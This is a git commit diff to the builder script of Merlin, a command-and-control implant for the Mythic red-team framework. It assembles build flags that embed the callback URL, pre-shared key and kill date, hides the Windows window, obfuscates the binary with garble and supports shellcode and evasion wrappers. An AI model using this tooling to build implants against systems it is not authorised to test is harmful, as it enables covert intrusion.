05161211700142bc24131f2e3b174316e4121bbd
Ne0nd0g <Russel.VanTuyl@gmail.com>
2022-03-25 07:39:20 -0400

    merlin v1.3.1, shellcode, DLLs, and wrapper payloads

--- Payload_Type/merlin/mythic/agent_functions/builder.py
+++ Payload_Type/merlin/mythic/agent_functions/builder.py
@@ -5,7 +5,6 @@ from mythic_payloadtype_container.MythicRPC import *
 import asyncio
 import os
 import time
-import secrets
 
 # Set to enable debug output to Mythic
 debug = False
@@ -17,8 +16,8 @@ class Merlin(PayloadType):
     file_extension = ""  # default file extension to use when creating payloads
     author = "Russel Van Tuyl - @Ne0nd0g"  # author of the payload type
     supported_os = [SupportedOS.Windows, SupportedOS.Linux, SupportedOS.MacOS, SupportedOS("freebsd"), SupportedOS("openbsd"), SupportedOS("solaris")]  # supported OS and architecture combos
-    wrapper = False  # does this payload type act as a wrapper for another payloads inside of it?
-    wrapped_payloads = []  # if so, which payload types
+    wrapper = False  # does this payload type act as a wrapper for another payloads inside it?
+    wrapped_payloads = ["service_wrapper", "scarecrow_wrapper"]  # if so, which payload types
     note = """A port of Merlin from https://www.github.com/Ne0nd0g/merlin to Mythic"""
     # setting this to True allows users to only select a subset of commands when generating a payload
     supports_dynamic_loading = False
@@ -141,140 +140,76 @@ class Merlin(PayloadType):
                     (self.get_parameter("buildmode") == "shared" or self.get_parameter("buildmode") == "raw"):
                 command += "export CC=x86_64-w64-mingw32-gcc CXX=x86_64-w64-mingw32-g++ CGO_ENABLED=1;"
 
-            if self.get_parameter("garble") and profile != "merlin-http":
-                # Can't garble or include in GOPRIVATE: go.dedis.ch/kyber,github.com/lucas-clemente/quic-go/internal/qtls
-                # Can't use Garble because it doesn't handle ldflags for -X parameters
-                # https://github.com/burrowers/garble/issues/323
-                # Currently the only option is to open the file and replace the strings to prevent using ldflags
-                command += "export GOGARBLE=golang.org,gopkg.in,github.com/Ne0nd0g,github.com/fatih,github.com/google,github.com/satori,github.com/mattn,github.com/refraction-networking,github.com/cretz;"
-                command += "export CGO_ENABLED=0;"
-                go_cmd = f'garble -tiny -literals -seed {secrets.token_hex(32)} build -o {output_file} -ldflags \''
-
-                # For the record, I'm not a fan of doing things this way. Temporary until Garble can handle ldflags
-                merlin = open(str(self.agent_code_path.joinpath("main.go")), "rt")
-                data = merlin.read()
-                # C2 Profile
-                data = data.replace('var profile = ""', f'var profile = "{c2_profile["name"]}"')
-                # payloadID
-                data = data.replace('var payloadID = ""', f'var payloadID = "{self.uuid}"')
-                # URL
-                if profile == "http":
-                    data = data.replace('var url = "https://127.0.0.1:443"', f'var url = "{c2_params["callback_host"]}:{c2_params["callback_port"]}/{c2_params["post_uri"]}"')
-                elif profile == "merlin-http":
-                    uris = str.split(c2_params["uri"], ",")
-                    if len(uris) > 1:
-                        all_uris = ""
-                        for uri in uris:
-                            all_uris += f'{c2_params["host"]}:{c2_params["port"]}/{uri},'
-                        data = data.replace('var url = "https://127.0.0.1:443"', f'var url = "{all_uris.rstrip(",")}"')
-                    else:
-                        data = data.replace('var url = "https://127.0.0.1:443"', f'var url = "{c2_params["host"]}:{c2_params["port"]}/{c2_params["uri"]}"')
-                # Pre-Shared Key (PSK)
-                data = data.replace('var psk string', f'var psk = "{psk}"')
-                # HTTP Headers
-                for header in c2_params["headers"]:
-                    if header["key"] == "User-Agent":
-                        data = data.replace('var useragent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"', f'var useragent = "{header["value"]}"')
-                    elif header["key"] == "Host":
-                        data = data.replace('var host string', f'var host = "{header["value"]}"')
-                # Sleep
-                data = data.replace('var sleep = "30s"', f'var sleep = "{c2_params["callback_interval"]}s"')
-                # skew
-                data = data.replace('var skew = "3000"', f'var skew = "{int(c2_params["callback_interval"]) * 1000}"')
-                # Kill Date
-                data = data.replace('var killdate = "0"', f'var killdate = "{str(int(time.mktime(time.strptime(c2_params["killdate"], "%Y-%m-%d"))))}"')
-                # Max Retry
-                data = data.replace('var maxretry = "7"', f'var maxretry = "{self.get_parameter("maxretry")}"')
-                # Padding
-                data = data.replace('var padding = "4096"', f'var padding = "{self.get_parameter("padding")}"')
-                # Verbose
-                data = data.replace('var verbose = "false"', f'var verbose = "{self.get_parameter("verbose")}"')
-                # Debug
-                data = data.replace('var debug = "false"', f'var debug = "{self.get_parameter("debug")}"')
-                # Proxy
-                if c2_params["proxy_host"]:
-                    data = data.replace('var proxy string', f'var proxy = "{c2_params["proxy_host"]}:{c2_params["proxy_port"]}"')
-                # JA3 String
-                if self.get_parameter("ja3"):
-                    data = data.replace('var ja3 string', f'var ja3 = "{self.get_parameter("ja3")}"')
-
-                # Write to a new file to preserve the original source
-                garbled = open(str(self.agent_code_path.joinpath("garbled.go")), "wt")
-                garbled.write(data)
-                garbled.close()
-                merlin.close()
-            elif selected_os == "windows" and \
-                    (self.get_parameter("buildmode") == "shared" or self.get_parameter("buildmode") == "raw"):
-                go_cmd = f'go build -buildmode=c-archive -o main.a -ldflags \'-s -w '
-            elif self.get_parameter("buildmode") == "shared":
-                go_cmd = f'go build -buildmode=c-shared -o {output_file} -ldflags \'-s -w '
-            else:
-                go_cmd = f'go build -o {output_file} -ldflags \'-s -w '
-
-            if selected_os == "windows" \
-                    and (not self.get_parameter("debug") and not self.get_parameter("verbose")) \
-                    and self.get_parameter("buildmode") == "default":
-                go_cmd += "-H=windowsgui "
-            # payloadID
-            go_cmd += "-X \"main.payloadID=" + f'{self.uuid}\"'
-            # profile
-            go_cmd += " -X \"main.profile=" + f'{c2_profile["name"]}\"'
+            # Setup GO LDFLAGS
+            ldflags = "\'"
+            # PayloadID
+            ldflags += "-X \"main.payloadID=" + f'{self.uuid}\"'
+            # Profile
+            ldflags += " -X \"main.profile=" + f'{c2_profile["name"]}\"'
             # URL
             if profile == "http":
-                go_cmd += f' -X \"main.url={c2_params["callback_host"]}:{c2_params["callback_port"]}/{c2_params["post_uri"]}\"'
+                ldflags += f' -X \"main.url={c2_params["callback_host"]}:{c2_params["callback_port"]}/{c2_params["post_uri"]}\"'
             elif profile == "merlin-http":
-                go_cmd += f' -X \"main.url={c2_params["host"]}:{c2_params["port"]}{c2_params["uri"].split(",")[0]}\"'
+                ldflags += f' -X \"main.url={c2_params["host"]}:{c2_params["port"]}{c2_params["uri"].split(",")[0]}\"'
             # Pre-Shared Key (PSK)
-            go_cmd += f' -X \"main.psk={psk}\"'
+            ldflags += f' -X \"main.psk={psk}\"'
             # HTTP Headers
             for header in c2_params["headers"]:
                 if header["key"] == "User-Agent":
-                    go_cmd += f' -X \"main.useragent={header["value"]}\"'
+                    ldflags += f' -X \"main.useragent={header["value"]}\"'
                 elif header["key"] == "Host":
-                    go_cmd += f' -X \"main.host={header["value"]}\"'
+                    ldflags += f' -X \"main.host={header["value"]}\"'
             # Sleep
-            go_cmd += f' -X \"main.sleep={c2_params["callback_interval"]}s\"'
+            ldflags += f' -X \"main.sleep={c2_params["callback_interval"]}s\"'
             # Skew
-            skew = int(c2_params["callback_interval"]) * 1000
-            go_cmd += f' -X \"main.skew={skew}\"'
+            ldflags += f' -X \"main.skew={int(c2_params["callback_interval"]) * 1000}\"'
             # Kill Date
             killdate = str(int(time.mktime(time.strptime(c2_params["killdate"], "%Y-%m-%d"))))
-            go_cmd += f' -X \"main.killdate={killdate}\"'
+            ldflags += f' -X \"main.killdate={killdate}\"'
             # Max Retry
-            go_cmd += f' -X \"main.maxretry={self.get_parameter("maxretry")}\"'
+            ldflags += f' -X \"main.maxretry={self.get_parameter("maxretry")}\"'
             # Padding
-            go_cmd += f' -X \"main.padding={self.get_parameter("padding")}\"'
+            ldflags += f' -X \"main.padding={self.get_parameter("padding")}\"'
             # Verbose
-            go_cmd += f' -X \"main.verbose={self.get_parameter("verbose")}\"'
+            ldflags += f' -X \"main.verbose={self.get_parameter("verbose")}\"'
             # Debug
-            go_cmd += f' -X \"main.debug={self.get_parameter("debug")}\"'
+            ldflags += f' -X \"main.debug={self.get_parameter("debug")}\"'
             # Proxy
             if c2_params["proxy_host"]:
-                go_cmd += f' -X \"main.proxy={c2_params["proxy_host"]}:{c2_params["proxy_port"]}\"'
+                ldflags += f' -X \"main.proxy={c2_params["proxy_host"]}:{c2_params["proxy_port"]}\"'
             # JA3 String
             if self.get_parameter("ja3"):
-                go_cmd += f' -X \"main.ja3={self.get_parameter("ja3")}\"'
+                ldflags += f' -X \"main.ja3={self.get_parameter("ja3")}\"'
+            # Windows Verbose/Debug - If verbose/debug are NOT selected, set this to make the agent window not visible
+            if selected_os == "windows" and (not self.get_parameter("debug") and not self.get_parameter("verbose")) and self.get_parameter("buildmode") == "default":
+                ldflags += " -H=windowsgui"
+            # Omit the symbol table and debug information / Omit the DWARF symbol table.
+            ldflags += " -s -w -buildid=\'"
 
-            # Everything else
-            # Windows DLL
+            # Setup GO command
+            go_cmd = ""
+            # Windows DLL - Depends on c-archive and output file name to be main.a
             if selected_os == "windows" and \
                     (self.get_parameter("buildmode") == "shared" or self.get_parameter("buildmode") == "raw"):
                 if not output_file.endswith(".dll"):
                     output_file = f'{output_file}.dll'
-                go_cmd += " -buildid=\' main.go dll.go;"
-                go_cmd += f"x86_64-w64-mingw32-gcc -shared -pthread -o {output_file} merlin.c main.a " \
+                go_cmd = f'build -buildmode=c-archive -o main.a -ldflags {ldflags} main.go dll.go'
+                go_cmd += f";x86_64-w64-mingw32-gcc -shared -pthread -o {output_file} merlin.c main.a " \
                           "-lwinmm -lntdll -lws2_32"
-            elif self.get_parameter("garble") and profile != "merlin-http":
-                go_cmd += " -buildid=\' garbled.go"
-            elif self.get_parameter("garble") and profile == "merlin-http":
-                resp.build_message += "\nMerlin can't be Garbled when using the merlin-http C2 profile." \
-                                      " Use Mythic's HTTP C2 profile instead\n"
-                go_cmd += " -buildid=\' main.go"
+                if not output_file.endswith(".dll"):
+                    output_file = f'{output_file}.dll'
+            elif self.get_parameter("buildmode") == "shared":
+                go_cmd = f'build -buildmode=c-shared -o {output_file} -ldflags {ldflags} -tags shared main.go shared.go'
             else:
-                if self.get_parameter("buildmode") == "shared":
-                    go_cmd += " -buildid=\' -tags shared main.go shared.go"
-                else:
-                    go_cmd += " -buildid=\' main.go"
+                go_cmd = f'build -buildmode=default -o {output_file} -ldflags {ldflags} main.go'
+
+            # Setup Garble
+            if self.get_parameter("garble"):
+                command += "export GOGARBLE=golang.org,gopkg.in,github.com;"
+                # command += "export CGO_ENABLED=0;"
+                go_cmd = f'garble -tiny -literals -seed random {go_cmd}'
+            else:
+                go_cmd = f'go {go_cmd}'
 
             # Convert Windows DLL to shellcode with sRDI
             if selected_os == "windows" and self.get_parameter("buildmode") == "raw":
